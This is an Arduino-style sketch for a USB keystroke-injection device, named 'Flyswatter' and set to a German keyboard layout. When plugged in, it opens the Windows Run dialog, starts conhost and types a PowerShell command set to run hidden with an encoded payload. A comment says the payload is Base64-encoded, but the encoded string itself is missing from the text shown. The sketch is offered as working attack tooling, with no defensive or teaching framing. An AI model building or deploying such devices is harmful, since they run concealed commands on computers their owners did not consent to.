#include "USB.h"
#include "USBHIDKeyboard.h"
#include "keyboardLayout/KeyboardLayout.h"

USBHIDKeyboard Keyboard;

void setup() {
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, LOW);


  //Serial.begin(9600);

  Keyboard.begin(KeyboardLayout_de_DE);
  USB.productName("Flyswatter");
  USB.begin();

  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.println("conhost");
  delay(1000);

  //Payload wurde in Base64 String umgewandelt
  Keyboard.println(R"(powershell -NoProfile -WindowStyle Hidden -EncodedCommand )");

}

void loop() {
  //Serial.println("Test");
  delay(1000);
}